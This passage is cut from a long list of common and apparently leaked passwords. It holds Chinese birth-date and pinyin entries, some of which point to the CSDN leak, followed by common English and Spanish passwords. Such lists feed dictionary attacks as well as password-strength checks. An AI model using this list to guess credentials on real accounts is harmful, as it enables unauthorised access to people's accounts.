50203","19890518","19870414","19820427","12311231","19890328","happyhappy","19820805","www12345","shangxin","19811003","qunimade","www.csdn.net","19830130","198712821","19840618","19870326","19810202","31313131","19860517","19880407","19821113","19830729","19850328","19890409","19283746","19890718","19890627","19830914","19880716","WANGXING","19820109","19850915","wen123456","19890515","19850509","HY123456","008008008","13243546","123123asd","j123456789","19811031","19830311","891129aaa","19830115","19840922","19840816","zxcvbnm,./","19830718","19840514","33455432","19860627","19811103","19840318","19860424","19830917","19860328","19820722","19840617","19801130","19820121","19870730","19840115","74511940","19890726","19781028","19840108","19880322","ma123456","19901225","10221022","19820815","19820708","112233445","19810918","33336666","19801201","huanghui","19830719","19880607","asd123asd123","123321000","liuliuliu","19830613","19781218","19901019","19830812","19850906","19830811","131421131421","19830421","19890902","changjiang","1234567abc","19880719","19830208","19860628","19860604","19850814","108108108","19860121","19850803","19781010","19850227","f123456789","my123456","19860528","19801007","11111111q","123456dd","19870507","19840826","19860525","19850321","19820322","19830512","19820528","wx123456","tianyuan","19890814","45685200","huanjue321","19820428","19820820","china2008","19850605","19850426","19820118","kxtn888cn","19820125","19880121","jkljkljkl","19820623","127127127","123456wang","19811102","19840522","a1314521","azxcvbnm","19890401","19830924","makelove","123ABCDE","19860111","19820506","66886688","19840109","19890802","19880328","19820212","az123456","19810920","19900201","19890225","19890428","19820302","33787943","19890922","12345677654321","19830615","19830614","huangyan","love1234","19840314","19820712","19840707","123456.0","19820726","12301230123","19820301","yangning","aaabbbccc","19860507","19810925","19901012","19860503","19860508","sxg007007","kisskiss","2012comeer","q00000000","baobei520","19890524","19850324","19840804","19870403","t123456789","wozhiaini","zhoufeng","13579000","19810609","66079350","187222455","19890819","19840408","19820328","01233210","19820622","19850905","19880522","1346798520","c120696363520","19820716","19820624","19801214","zxcvbnm123456","frenzy673954","19850419","123789abc","3714261985","nihaonihao","qwaszx12","19890723","68973435779","2582587758","19840325","chenxiao","zhangyun","44448888","13145211","19901990","19840324","19830105","123123000","19820128","19801011","wodeshijie","wwwswcy588","19850323","19820501","19850515","19820423","qqqwwweee","77582580","19840724","19830709","19811130","huaihuai","19811107","19860827","11011011","132132132","csdn2010","qingtian","19850528","794613852","guo123456","19880807","19840308","19830111","19830708","19850505","chenyong","19850423","65656565","zxcvbnml","0000oooo","19880717","19890505","sssssssss","19850616","19810924","19890227","19830806","10181018","19820901","kkk52789","qq520520","wodeai123","19860404","19811206","19791025","314159265358","lovejing","zhang1234","19840523","19890822","19850708","13145211314521","jiushini","zzzz1111","19830816","woxihuan","19811227","19840709","19890913","19801019","zhangchen","19830610","19890207","214214214","19830822","19801216","19890406","huyunqiao","998998998","19890629","19850712","19890729","wang1989","abcdef123456","19880705","19850604","woainimama","19880507","19830605","zhao123456","19880424","zxcvb123","woainilaopo","19850703","19890506","19820228","19810628","19890527","19820126","qwerfdsa","19820719","19820402","19830423","19840128","19801221","sunsunsun","19830112","weiyu371","19890521","19870930","xihuanni","12345678aa","3216732167","19830417","19830104","131415926","13654006821","chenpeng","zxcvbnm0","12340000","19880417","19840607","123321abc","19870117","19850213","woaibaobao","gjxhsgjxhs","881125881125","whosyourdaddy","19890512","19850319","19840703","19880222","19801023","19810916","19890702","19811002","f12345678","19850718","321456789","19820104","19791010","19830309","52013148","lixiaolong","28282828","19830927","lr1028829","19880527","wanghong","77587758","q123456q","114114114","19850729","311311311","19860119","19840412","19830628","19870508","asd123321","19840627","19830813","19820313","3135134162","df000000","19830724","19890911","ht123456","19890621","19860423","19820824","huangtao","19870527","19890426","19901011","24242424","19850409","84821742","82828282","19820426","19890714","19810926","19840502","19791228","19840428","19801027","19850307","19840323","19830318","7758258123","19810812","123.123.","19830703","19890423","19820603","19840817","19850311","3.1415926535","qwe123qwe123","csdnmima","19900125","19830603","19870514","19850329","babamama","68856636","abcde123","19810901","2582525775","1020304050","ilovechina","19901122","kk413200","33221100","19840819","baishikele","1qazxsw23edc","19840224","19850503","jiangfeng","19820218","19860622","19880410","19830127","19850829","19820227","19840812","19830818","19860613","19880323","19820419","19840118","19890908","19840907","19890513","19890121","19850702","zhangjia","19840608","19820830","19820407","19840508","19840107","19801005","cheng123","19850705","19890724","74108520963.","19820226","19901220","19870704","19810928","251314251314","19850619","19840221","13145201","zq123456","19880416","jylk1314","maomao123","c12345678","19781122","19820614","19811009","iloveyou123","xiaozhang","19840621","feng123456","19830227","w5201314","19840716","19890217","19890721","19820414","wobuaini","19890516","19830501","baobei521","19801001","19840401","19880403","19860407","112358132134","sb987654321","19791026","19830608","19890118","52005200","19820628","19840113","0o0o0o0o","nnnnmmmm","19801116","13709394","19830821","19860511","a1s2d3f4g5","19850113","19840521","19801024","19890711","19900102","19820610","19850610","19820213","19830930","963214785","19860309","12152205","19830128","123456jj","abc123321","mrf11277215","19830204","a520520aa","19850706","19830912","19820504","123456888","19820526","lingfeng","19801118","19901230","19870506","19830326","123789123","19801206","654321abc","19840710","12345678W","z1111111","nevergiveup","19901014","19830710","19900126","19901212","19860427","19830707","huahuahua","19850811","comeonbaby","19801217","19830228","qwertyuiop123","19830320","98188729","7758521.","19850511","19810923","19840316","19890429","sunflower","xiaoqian","19850728","19820222","admintus","zzzzxxxx","19811205","123456789aaa","123456xyz","19811202","fuckyou123","19880409","19850620","19811208","19890414","19850422","a123456.","WOSHINIMA","cinderella","tqtwffgcc","19820405","19860322","123qwe456","19820518","chencheng","zhangcheng","y1234567","35353535","826826826","19880630","19900520","19840806","19820516","12345678@","19801128","5201314q","19820206","19880413","b123456789","19890223","19801211","19830522","19850519","19820725","19840322","a123a123","86680101","yangpeng","19820105","19890708","12251225","19811211","19900214","`1234567","19820611","19830404","wangsheng","19850406","19820424","19860530","19840529","19890403","12345qaz","19820710","19840714","19860803","123321456654","19890917","000000123","ddddddddd","123456789000","16881688","19830217","a88888888","19840623","19890519","19830903","xiaoqing","19830223","831101qsl","19850802","19850521","11121314","19860727","19840611","zhang520","19820728","qwe123asd","19810824","19791127","19840517","52771314","19830117","19840722","19840903","19820209","www.163.com","19820215","19850627","19840905","12332145","19830325","1qaz!QAZ","19860330","yesterday","19890609","wushuang","19850717","19901026","1231231230","19840206","2718281828","19830602","11201120","zhang1988","19801129","19850719","tblkspthkr","19840306","19860409","19840103","369874125","rrrrrrrr","eeeeeeee","19850602","19830620","19820621","19860413","jia123456","19840418","CATHERINE","19850812","19860524","19801015","19830225","19810902","2870873859","19820320","woainiaa","19810808","00001107","19801003","19880131","huangxin","evangelion","19840525","flyinsky","19820627","19811229","19801026","19801017","confidence","basketball","wodemingzi","19830528","xianjian","woshiwo123","suzhou@562718","wangfang","19850527","jin123456","19820527","19791101","54545454","19830904","19830301","19890402","520131415","19820612","OOOO0000","19830429","325325325","chenglong","19781226","z123123123","jasajasa","19791220","2wsxcde3","19820907","19820615","19850629","19860222","19840301","7758258a","a123b123","19811220","ff123456","19900206","7418529630","52013143344","19820420","19820129","19830627","19890522","19840802","19781224","19810919","19840613","zero696295","12345123","7758258258","19791030","1234567k","j2mv9jyyq6","19820519","19901218","k1234567","19820908","5845213344","abc147258","19880831","yangfeng","8975789757","aaabcabc","19830825","13245678","19830622","19840916","19850530","19840319","19830406","Love2008","20100101","19840320","000000aaa","hj123456","19820403","102030102030","19781123","19890610","19801107","lixy12345678","thinking","appleapple","woaini00","800800800","19860630","19850617","19830720","dfdfdfdf","haha1234","sh123456","19811114","19830408","19890226","19860225","19801103","lmj12345","110110110110","19860526","19850709","19820715","124578369","hao123.com","19830412","19840622","19830504","19840422","123456zzz","19820308","DINGDANG","hathaway","18273645","19890523","zhangfei","qqqaaazzz","19810823","19830819","19901030","32103210","xiaopang","z0000000","19900624","19801125","19840718","19830308","19781021","19830618","19781128","19820709","19840112","19820904","102102102","qq0000000","19840624","happiness","1234aaaa","19830604","feng19831","19820327","aaaaaa11","AAASSSDDD","646656xz7","anainima","10261026","19890827","asdfghjkl;","19830611","19820514","886886886","19840827","19900526","19880429","19840313","19850615","123456789987","11119999","19830129","boshigangchang","li7xi9bgn","19890903","19801126","19811030","19820106","19890517","19820811","19830305","19850208","19830803","19830829","19810217","198198198","xiaobing","3.141592654","liangwei","javajava","19890810","19830527","yuan1234","19850416","zhoujielun","19791123","19830525","19890704","19850904","19830514","qq7758258","asdf4321","fangyuan","19860502","11qqaazz","19830212","770880520","19890728","19830506","qqqqqq11","19830702","19840513","19830224","qiangqiang","19850306","19820305","xiaohong","11241124","19840519","aspirine","000000QQ","19820117","19840729","19901120","z11111111","wd123456","19850316","789852123","19820307","m12345678","zhou1234","aa5201314","19811201","19840515","zxasqw12","jackjack","19850428","19840914","ilovethisgame","19840620","00008888","LOVEFOREVER","19830619","123456678","liu5201314","19860519","24681012","19820713","wowowowo","19900818","19820116","19830503","qwerrewq","woaini123456","19840704","19830427","lu123456","19830824","19890511","19820409","888888889","````````","19890421","zhangXIANG","sjdf2ghjt","19820314","19771027","19900123","19830207","19850810","618618618","jfjscy8767","19860429","19890611","67676767","19890608","19830402","19890703","19860807","19811207","19850313","45678900","19901227","lp123456","woaini2008","zhanghan","zxcv123456","19870426","gertydrj","qqqq1234","feifei123","19850418","25897758","139139139","19820406","19830526","12231223","han123456","hello1234","shenshen","8866810635956388","lx123456","19890905","1234567z","19820705","zhangqing","19840429","abc5201314","19820323","11123456","20070101","118118118","19840518","19890720","1rtj689d","19810214","19830324","asdzxc123","detective","123456ss","19880703","19888888","753951456","QAZ123456789","19820520","qazqaz123","326326326","112358112358","woshinidaye","250976046","896352639","qwer12345","christina","19830407","19820524","zhangyao","19860313","19870407","jianfeng","linxing7778","19830905","19781212","12345678abc","19830328","12345699","19900216","19850327","maomao520","04230423","19901027","19850408","19820110","19801021","wsadwsad","abc1234567","19811006","19820421","19840125","19830317","19811209","19850411","19850514","12593000","19840426","98741236","1234rewq","19791224","dldldldl","mhh123456","19830422","19830711","12365412","619030475","520131456","19791111","19820303","19801110","yangcheng","19830123","19840403","19890408","nuttertools","66666688","19890809","19901221","wingzero","19820221","cd123456","19840609","19830902","gg123456","guoguoguo","mm5201314","xiaoxiang","131420131420","19901125","aaaaaa123","19840628","123456789s","19840327","zhangdong","19801008","zhaopeng","19820319","415415415","19820523","19810828","0000000.","justlike","zxc123zxc","yan123456","hao12345","1305821983","19801119","jiubugaosuni","19810610","19830712","054821054821","19830705","19810325","19900811","19801111","19791214","19890529","cisco123","310310310","135246789","AAA111111","shuchang","a987654321","19900329","19801223","x3561668","19830108","wodemeng","111111112","27272727","19811222","19890502","19890224","zhaoming","12191219","19900512","wang4040955","13143344","19850730","123456**","19890907","3106028011","123456789!","410651410651","huanxiang","aaaaa11111","qazwsx1234","00000011","19871271987","qaz123qaz","19900104","19811110","19840516","19830607","19880331","19901215","he123456","ac123456","19900118","33334444","19840131","1a1a1a1a","19830827","19830728","20021212","zcwdclqscll","19901211","19850507","pojaablog","hehehehe","liaoliao","19830508","www.baidu.com","fengling","19890622","19851031","19830507","zhouying","19840328","19830807","19840321","19890706","qq123654","13145201314","taotaotao","abcdefghi","19801013","19850524","zhang1986","19850817","huangjing","1230456789","f246865h","731731731","19850704","19830329","19850806","123abcabc","19850429","19801219","19781015","19901210","19830109","19801207","JI394SU3","19791119","19901124","19810521","lxsz60652","19781121","jianqiang","19810927","19830828","19790909","19820703","19801117","19820113","123zxc123","shuijing","19850714","nihaogxfc","846528ydt","12281228","19900110","19840222","19830121","19820625","linlinlin","34567890","choupiwang","19810312","19810912","19840705","19820205","19850222","19810801","wwwuploves","19791028","19890419","19820521","index0088","19850518","88998899","19890904","huanghua","fy641213","fengxiaofeng","19890716","78951230","12111211","jason123","19840715","19890804","0932313521","19820108","19900320","a0123456","19801106","gonzo1982","19900513","19830524","176219444","19890717","19811117","yydq1234","batistuta","showmethemoney","19840223","jiangjie","08290829","19900215","19801029","19830216","19830405","19850522","135521234","51885188","19850414","19840111","19830116","19900510","19791102","zhengwei","3.14159265","19811106","19790630","songjian","19830411","liuxiang","dddddddddd","19890602","34343434","19840511","19820317","19840407","liuzheng","19901224","19781211","19840423","19890417","shuishui","19811113","*963.*963.","123a123a","onepiece","19840603","chenqiang","chenying","csdn2009","123321ww","binbinbin","19840411","19840417","516516516","19901206","19860703","engineer","19820608","547896321","19791128","19941128","19800405","20100000","jianghua","jing006010","11251125","07070707","1r2t3y4u","19830314","wangwei123","zhangsan","19781111","11223311","12241224","sa123456","wangcong","19830716","22221111","admin123456","jiangshan","zhangmeng","123012301230","Jfew3289","19801127","19830722","19801114","19781012","windowss","19801102","19840507","19820819","52111314","82468246","19800819","zhangzhi","19791013","viewsonic","aaaaaa5061313","19901028","nishishei","19850225","19791024","maenbin1234","starstar","19880531","19830519","19830826","19901017","gutengda","19850330","zxcvbn123","YC123456","wangsong","a111111111","789987789","19860617","liudehua","19811005","1236987450","zz123123","19850512","526526526","19840415","19820607","19820602","133133133","19791226","19850117","10020000","shenxian","305488940","19830518","63636363","174292xy","19820605","123456789qwe","19830321","19820429","19900205","123456@@","xingkong","19850111","19840803","shinichi","19830401","218218218","19900801","xiaoguang","19801218","19810921","19830809","19820505","19850424","19840307","19760620","52000000","411192710","06060606","19850130","showtime","19791020","weiwei123","19840708","19820404","19820515","19781001","19830704","19791021","12141214","19840427","335201314","19840114","19810723","19830805","19850508","zhaoliang","99819981","syncmaster","135790135790","110120110120","19901214","wz123456","19810910","19900113","123qaz123","19820729","asdfgasdfg","1985111802","19850607","19880414","19791022","19801108","10161016","5201314abc","jiejiejie","36987412","11271127","19781225","wang1986","cj123456","19901002","753951123","19810304","wangshuo","12345asd","19790318","19830727","19840602","19850308","19850907","5203344587","19810922","wang1985","748159263","19830122","zhangxiao","81818181","19900124","ffflufei","19810915","61616161","77881230","19901013","ddzj49nb3","zhongguoren","ilikeyou","19791027","200802200802","123456789p","19880509","12345678qq","wodecsdn","19820310","kissalan","lz123456","zmczmc12","50206735020673","19900108","aidejiushini","19850404","19810905","33123456","12031203","19870331","19791104","t839k241","19830715","198710086","19820510","19810911","19840419","Romantic","128128128","p123456789","061112abc","19860425","19801122","45612312","zxcvbnmas","lw123456","19791979","xiaoping","221221221","123abcdef","19900820","987654321a","19801022","wozhidao","19830502","5213713752","729729729","sherlock","24682468","zhaojian","19890713","nihao123!","19781118","12340987","19820704","19850715","951753123","19810620","43420024","XM123123","19900208","19820220","19810826","12345abcd","19830426","kingkong","tinglove","19830908","131452100","19850630","19860609","qazwsxedc123","19840509","ch123456","xiao1234","19890407","tianfeng","as123123","19900227","19900203","19811118","52113141","19830517","chrdwhdhxt","10111011","19830907","1234567809","19840317","chenxing","19901021","584334421","cj7152821","quanquan","dby123456","windowswindows","99996666","19830419","jingling","wiii2ds1","qwerasdfzxcv","19801109","19781126","lovecsdn","19820130","19810621","19890727","baobaobao","53589793","liwei123","q1q2q3q4","loveyou1314","happy2008","1234567890-=","19901126","icandoit","19830617","19840616","19850417","19801229","19860704","dg123456789","19900105","129129129","19810310","19801009","woshi007","19840413","00000007","116116116","19810930","jiangbin","876543210","24681357","19810825","19820613","10000001","scandisk","19850000","19810618","19810221","19811119","12346899","19830221","520131411","19810917","19830304","2wsx3edc","dadadada","9874563210","zxczxc123","77585201314","19820718","123456ly","01478963","19810606","510406030","birthday","welcome123","19850427","fengjian","xiaozhuzhu","19810203","16899052","19860221","1z2x3c4v","fishfish","zxcvasdf","19860323","19791012","19840717","yy5201314","85411165","19820311","19791015","19781026","521125521125","19850710","wodeweilai","19791023","19781025","jinjinjin","fengpeng","19781023","13128255707","521521521521","19890617","happy2000","19830616","19890430","19810601","110112113","dajiahao","hangzhou","19791008","123321qwe","19900505","trustno1","04061018","cy123456","852741963","19900916","xxxxxxxxx","asddsaasd","19830516","CZ123456","87651234","19900516","19781230","19850402","19810307","456123456","ZXCVBNMMNBVCXZ","19810623","19810720","19890507","159357159","1234567.","19810228","90332773","19801018","000000001","y12345678","023023023","19900523","19850526","194983521","56785678","19900707","ssssssssss","19781210","19801205","13919936479","19901101","wc625799","19820503","justsoso","19830804","123456789..","19820806","19850813","lc123456","01314520","19890509","19890630","12101210","75395100","77885210","254044375","19850413","19830415","19830706","wangkang","95959595","hongjuan","19810527","19850119","19820803","z1x2c3v4","19830330","19901117","00724015","19830410","19820122","0000aaaa","19901130","01234567890","19840503","wwwcsdnnet","sleigh1368","19900525","19781220","12300a00a","19820324","19810301","professional","19810619","19900321","zhangping","aceracer","084119084123","19810815","daydayup","19901105","19900503","19781022","guangguang","lvfeididi","19791218","mlf12345","0p9o8i7u","19890422","yueyue521","19900219","123321aaa","wangling","10211021","19830125","zhuang123","19820111","569874123","19791120","19781018","liuyang123","xiaojiang","chinachina","26511314","d123456789","1314520QQ","19901213","cx123456","19810116","andyandy","316316316","b12345678","zhangting","ruanjian","zhao1234","aa12345678","19820804","19820629","ww111111","456852852","woaideren","19781011","shandong","fy123456","aaaqqq123","12021202","141592653","lbjx9j11","l123l456","19900301","987456123","ericsson","520131488","xingaixing","00112900","xiaochao","19801204","t1234567","19900213","19820329","528528528","weiwei520","a77493618","54185418","88888888A","jianglei","19840805","19810306","xiaomeng","zxcvbnmasdfghjkl","lishuang","19820724","cheng428","000000..","19840619","langlang","19820411","19820330","woaini111","ls123456","20042008","zxc123456789","790297648","19820717","19830119","success777","nihaihaoma","19810816","19810510","19791108","19791217","123456111","k12345678","19820525","hx2010seo","liucheng","123456ff","19900109","sky123456","tongyong","66700388","13628792658","k123456789","abcde1234","19850516","123abc123abc","555666777","19810126","19801105","203203203","19890514","13142659","as123456789","wodedipan","XiaoWang","abcdefghijklmn","hibernate","19900228","19801224","19781120","45683968","xm123456","woaitl520","520131499","12347890","19781104","19830529","19781221","19830118","lightning","19771126","19830416","19901008","19781223","14725800","hengheng","rifhv123456","19781101","zhangbing","74185296","852852852","318318318","184866884","jinsheng","19820112","asd00000","liujiang","159753159","19900314","19810121","jianghao","Sina.com","19901123","chouchou","85602222","19791213","66667777","19840524","492357816","abcdefghijk","7758521000","19811004","197912wsr","19820702","19850716","5201314159","chenqian","88880000","19810705","19781215","19830107","huangkai","19790916","FANG123456","huanghai","123456www","shenjian","19771010","19850713","19901102","lz11180607","goodmorning","haha123456","wh123456","19810416","19901029","2999811983","123654aa","woaini110","woaimeinv","yh123456","iiiiiiii","74747474","19801231","19810212","19900824","20072008","YL123456","135791113","tang123456","19791208","1234567895","iloveyou520","19810425","baobao521","system32","xiaolang","19810712","sx123456","19850118","19840930","13456789","124124124","07742216","feifei521","33338888","19820616","lb123456","qasdfrghy1","19810219","123456789999","e65351656","19810311","wangjuan","19870430","xiaobudian","19830523","woaibabamama","19791109","19900312","19810206","456852456","t12345678","19820609","yx12345678","qingshan","19781116","19810707","19810528","programmer","11122233","caonima1","19820530","19810119","19830830","19840730","qazwsxqazwsx","qiaoqiao","19810617","woshiyizhiyu","19810719","19901001","wuyongchong","qsd34678321","19900910","748748748","04200116","wsw800168","19900306","19830723","logitech","19761976","12345678x","7215217758","19791212","0123654789","yangxiao","10191019","19901129","136136136","rootroot","19830717","tianlong","84423196","xiaoyu520","zzxxccvv","19830428","19880619","12171217","yingxiong","19901115","cao123456","19900209","a11223344","19901128","daohaosima","21436587","19840402","19790315","19781113","aaaaaaa1","sunmenga1","19901110","11011101","FAN123456","19810813","19810721","qw123123","jiangyan","30798764681","19801115","pass@word1","56781234","qingsong","12351235","19810124","614614614","19810627","yangling","xiaokang","19810314","weiqiang","12261226","jiangjian","19810318","huangjin","19900207","wangyonglang","19830609","19810504","112233qq","6668881204511","jiangxin","13530023404","7894561230.","19830424","hhhhhhhhhh","1a2s3d4f5g","cai123456","19810320","19771020","wwwyhjd198cn","zhoujing","xxx123456","19901111","tc123456","82537724","517517517","668668668","lh123456","12041204","111111qqq","s5201314","5201314584","19790822","huangjun","010203040506","woaiwolaopo","aiwosuoai","545007273","xiongxiong","kongkong","yangqing","Hellocsdn","19781203","c3df32ea","19900218","123asdfg","19900415","19900122","123456789b","789512357","sw123456","A123456789a","yangshuai","19820508","19791105","19870831","yangzhen","52100000","qq5211314","19890427","03030303","19810213","19901112","wangjile","19800312","19781228","1593572468","12349876","w4cuvji2","youloveme","19830420","beckham7","woaijing","19900711","qa123456","19900211","lk123456","5845131420","ai123456","19890528","65432111","7758258520","killer123","19850401","yygjmy333","19900718","shenlong","8012160713","XIONGWEI","eyesonme","question","20092010","319319319","89080620084","qwertyuiop[]","19810629","19791125","624624624","sunupsun","191154120","19791225","19781112","584521584521","19800613","19900202","7758521qq","yuanchao","woshishuaige","16897188","system123","9632587410","redapple","19900217","8630516boss","jianglong","19790203","zhang521","19810817","885201314","19850403","20080101","ty123456","19791229","06124308030","19491001abc","zhangchi","19791019","19901003","2269439999","19900210","521125521","19781202","15890193764","19901127","woaiwodejia","012520wadll","qwedsazxc","19820321","122122122","19820604","qazwsx11","58080596547","happy2010","zhangquan","doraemon","19870531","happy1314","19810701","woaini12","19850930","xiang123","woaini99","19810626","shuangshuang","27182818","19800812","xiaotang","0111424dd","liushuai","abc651114","19830511","23242526","19810327","111111222222","panasonic","maikuraki","19781115","xinxinxin","happy2009","zhan1234","19900307","19850517","likelike","19791029","sl123456","19800216","123987456","19971997","zhaofeng","4294967296","19810624","2876180com","simileplun","00998877","19820207","19810711","4444444444","javazfj1jie","happy520","100000000","502502502","19820517","999666333","19810412","yangbing","123456lj","liverpool","19800916","a1b2c3","ncc1701","8675309","ashley","stephanie","a12345","bond007","david1","chocolate","happy1","katherine","route66","snowball","thunderbird","viper1","xyz123","696969","Anthony","Joshua","Matthew","Tigger","aaron","abby","bubba1","catch22","charlotte","chris1","cooter","dumbass","elizabeth","freak1","jason1","jesus1","julie1","justin1","kelly1","kevin1","larry1","lucky1","martin1","master1","mensuck","money1","phoenix1","robert1","shadow1","sonic","sunny1","teddy1","valentine","1212","Andrew","Family","Friends","Michael","Michelle","Snoopy","abigail","account","alex1","alice1","andre1","andrea1","angel1","anita","annette","antares","aragorn","arnold","arsenal","avenger","babydoll","batman1","beast","beatrice","bella","bigben","biggles","bishop","bluefish","bosco","bruno","butter","california","carebear","carol1","catalina","catherine","chelsea1","chester1","christian","commander","cooking","cuervo","daniel1","davids","denis","destiny","dragonfly","emerald","excalibur","foster","francesco","francine","fuckface","germany","gilbert","goaway","goldfish","goose","graham","heaven","helena","hithere","ibanez","idontknow","integra","isabel","jackass","jenny1","johan","joker1","jumanji","kangaroo","karen1","keepout","keith1","kitkat","lawrence","lawyer","liberty","lola","lonely","madonna","marathon","maria1","mariah1","maxine","meggie","melody","michael1","mike1","miracle","molly1","moore","mouse1","mulder","nirvana1","notebook","ocean","ollie","oregon","pencil","person","peter1","pinkfloyd","pookie1","poppy","predator","q1w2e3","queen","queenie","quentin","ralph","rangers","remote","ricardo","ricardo1","roadrunner","robinhood","rocknroll","rocky1","ruthie","sakura","scott1","scottie","serena","shogun","skull","skywalker","snowflake","soccer1","star69","steven1","strawberry","superfly","teddybear","tornado","trojan","truman","warlock","winona","woofwoof","zigzag","zxc123","007007","11111","171717","181818","1a2b3c","1chris","4runner","55555","6969","Alexis","Bailey","Charlie","Chris","Daniel","Dragon","Elizabeth","HARLEY","Heather","Jennifer","Jessica","Jordan","KILLER","Nicholas","Password","Princess","Purple","Rebecca","Robert","Shadow","Steven","Summer","Sunshine","Superman","Taylor","Thomas","Victoria","abcd123","accord","africa","airborne","alfaro","alina","aline","aloha","alpha1","althea","altima","amanda1","amazing","andrew1","andromeda","angie1","anything","apple1","apple2","applepie","aquarius","arlene","artemis","ashley1","ashraf","ashton","autumn","babes","bambi","barney1","barrett","bball","beaches","beans","beauty","becca","belize","belmont","benji","bernardo","berry","betsy","bigboss","billy1","biscuit","bitter","blackjack","blah","blanche","blood","blowjob","blueeyes","blues","bogart","bombay","boobie","boxers","brent","bronco","bronte","brother","bryan","bubble","budgie","burton","byron","calendar","calvin1","camel","camille","carbon","carnage","carolyn","carrot","cathy","catwoman","cecile","change","chantal","charger","chiara","chris123","christ1","christmas","christopher","cindy1","cinema","civic","clueless","cobain","cody","colette","colors","colt45","confused","corvette","cosmo","crusader","cunningham","cupcake","dagger","dammit","daphne","darkstar","darryl","deborah","deeznuts","delano","delete","demon","denny","desert","deskjet","devil","devine","devon","dianne","diesel","dollar","dolly","dominique","dontknow","doudou","downtown","dragon1","driver","dudley","dutchess","eagle1","eastern","edith","edmund","eight","element","elissa","empire","enterprise","erin","escort","estelle","evelyn","explore","family1","fatboy","felipe","ferguson","ferris","fishes","fishie","florida1","flowerpot","forward","freddie","freebird","freeman","frisco","fritz","froggie","froggies","fucku","gabby","games","garcia","gaston","george1","germany1","getout","giselle","gmoney","goblin","gollum","gremlin","grizzly","guitar1","gustavo","haggis","haha","hailey","halloween","hamilton","hamlet","hardcore","harley1","harriet","harris","harvard","heather1","heather2","hedgehog","helene","hello1","heythere","highland","hilda","hillary","hitler","hobbes","holiday","honda1","hudson","hummer","huskies","iforget","iloveu","impact","indonesia","irina","israel","jackie1","jakey","james1","jamesbond","jamie","jamjam","jeffrey1","jennie","jesse","jesse1","jethro","jimmy","joelle","john316","jordie","jorge","journey","joyce","jubilee","jules","julien","juliet","juniper","karin","karine","karma","katerina","katie1","keeper","keller","kendall","kenny","ketchup","kings","kissme","kittycat","kkkkkk","kristine","labtec","lance","laurel","lawson","leader","leland","lemon","lester","letters","lexus1","libra","lights","lionel","lizzy","lolita","lonestar","longhorn","loren","lorna","lovers","lucia","lucifer","lucky14","maddie","madmax","magic1","maiden","maine","management","manson","manuel","marielle","marshall","maxmax","meatloaf","melina","mermaid","miami","michigan","mickey1","milano","millenium","miriam","mmmmmm","mobile","monkey1","monroe","monty","moonbeam","morpheus","motorola","movies","munchkin","murray","mustang1","nadia","nadine","nation","national","nestle","newlife","newyork1","nichole","nikki","nintendo","nokia","nomore","normal","norton","noway","number9","numbers","nutmeg","ohshit","oicu812","omega","openup","oreo","paloma","pancake","panic","parola","partner","patriots","pauline","payton","peach","peanuts","pedro1","perfect","peterpan","philips","phillips","phone","pigeon","pink","pioneer","piper1","poetry","pontiac","pookey","prayer","precious","prelude","premier","puddin","pulsar","pussy","pussy1","rabbit1","rachelle","randy1","ravens","redman","redskins","reggae","renegade","rescue","revolution","richard1","richards","richmond","riley","robby","roberts","rocket1","rockie","rockon","roger1","rogers","roland","rommel","rookie","rootbeer","ruthless","sabbath","sabina","saint","samiam","samsam","sandi","sanjose","saphire","sarah1","saturday","scoobydoo","scooter1","scouts","search","september","seven7","shaggy","shanny","shaolin","shasta","shayne","simba1","sinatra","sirius","skate","skipper1","skyler","sleepy","slider","smile1","smitty","smoke","snakes","snapper","snoop","solomon","sophia","sparks","spartan","spike1","sponge","spurs","squash","starlight","stars","steph1","steve1","stevens","stewart","stone","stranger","stretch","strong","studio","stumpy","sucker","suckme","sultan","summit","sunfire","surfing","susan1","sutton","sweden","swordfish","tabatha","taiwan","tamtam","terry1","theend","thompson","thrasher","tiger2","tinkerbell","tototo","treasure","trees","tricky","trish","triton","trombone","trucker","tyler1","ultimate","unique","united","ursula","vacation","valley","venice","vicki","victor1","vincent1","violin","virgil","vortex","waiting","water1","wayne1","wendy1","whocares","william1","wilma","window","winniethepooh","wolverine","yankee","yogibear","yolanda","yvette","zebras","zxcvbn","13579","90210","ABC123","anaconda","apollo13","chandler","charlie1","eminem","fearless","forever","nigel","patton","rambo1","rancid","babygirl","pretty","hottie","teamo","naruto","spongebob","daniela","princesa","blessed","single","pokemon","iloveyou1","iloveyou2","fuckyou1","hahaha","poop","blessing","blahblah","blink182","trinity","google","looking","iloveyou!","qwerty1","onelove","mylove","ilovegod","football1","loving","emmanuel","red123","blabla","hallo","spiderman","simpsons","november","brooklyn","poopoo","darkness","159753","pineapple","drowssap","monkey12","wordpass","coolness","something","alexandra","estrella","miguel","iloveme","sayang","princess1","alejandro","brittany","alejandra","tequiero","antonio","00000","fernando","corazon","cristina","kisses","myspace","rebelde","babygurl","mahalkita","gabriela","pictures","hellokitty","babygirl1","angelica","mahalko","mariana","eduardo","andres","ronaldo","inuyasha","adriana","celtic","samsung","angelo","456789","sebastian","karina","barcelona","cameron","slipknot","cutiepie","50cent","bonita","maganda","babyboy","natalie","cuteako","javier","123654","bowwow","portugal","volleyball","cristian","bianca","chrisbrown","sweet","panget","benfica","love123","lollipop","camila","christine","lorena","andreea","charmed","rafael","brianna","aaliyah","johncena","gangsta","hiphop","mybaby","sergio","metallica","myspace1","babyblue","fernanda","sasuke","steaua","roberto","slideshow","santiago","jayson","jerome","gandako","gatita","babyko","246810","sweetheart","chivas","alberto","valeria","nicole1","leonardo","jayjay","liliana","sexygirl","232323","amores","anthony1","bitch1","fatima","miamor","lalala","252525","skittles","colombia","159357","manutd","123456a","britney","katrina","pasaway","mahal","tatiana","cantik","0123456","teiubesc","natalia","francisco","amorcito","paola","angelito","manchester","mommy1","amigos","marlon","linkinpark","147852","diego","444444","iverson","andrei","justine","pimpin","fashion","bestfriend","england","hermosa","102030","sporting","potter","iloveu2","number1","212121","truelove","jayden","savannah","hottie1","ganda","scotland","ilovehim","shakira","estrellita","brandon1","familia","love12","omarion","monkeys","loverboy","elijah","ronnie","mamita","broken","rodrigo","westside","mauricio","amigas","preciosa","shopping","flores","isabella","martinez","friendster","cheche","gracie","connor","valentina","darling","santos","joanne","fuckyou2","sunshine1","gangster","gloria","darkangel","bettyboop","jessica1","cheyenne","iubire","purple1","bestfriends","inlove","batista","karla","chacha","marian","sexyme","pogiako","jordan1","010203","daddy1","daddysgirl","billabong","pinky","erika","nenita","tigger1","gatito","lokita","maldita","buttercup","bambam","glitter","123789","sister","zacefron","tokiohotel","loveya","lovebug","bubblegum","marissa","cecilia","lollypop","nicolas","ariana","chubby","sexybitch","roxana","mememe","susana","baller","hotstuff","carter","babylove